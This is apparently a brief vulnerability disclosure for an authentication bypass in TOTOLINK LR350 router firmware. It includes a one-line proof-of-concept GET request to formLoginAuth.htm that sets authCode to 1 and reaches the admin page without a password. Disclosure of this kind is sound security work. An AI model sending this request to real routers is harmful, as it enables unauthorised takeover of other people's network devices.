# TOTOLINK LR350 Vulnerability
---
-   Vendor: TOTOLINK
-   Product: LR350
-   Version: LR350_firmware - V9.3.5u.6369_B20220309
-   Type: formAuthLogin bypass    
-   Author: c0nyy, Reisen_1943    

### Vulnerability description:

---
 - This vulnerability allows remote attackers to access the admin page without a password by manipulating the **authCode** parameter to **1** and setting the **goURL** parameter to **home.html**.
 - PoC: **GET /formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login HTTP/1.1**

![POC_LR350](https://github.com/user-attachments/assets/898d71a0-cce8-4273-8acb-826be03aa6c8)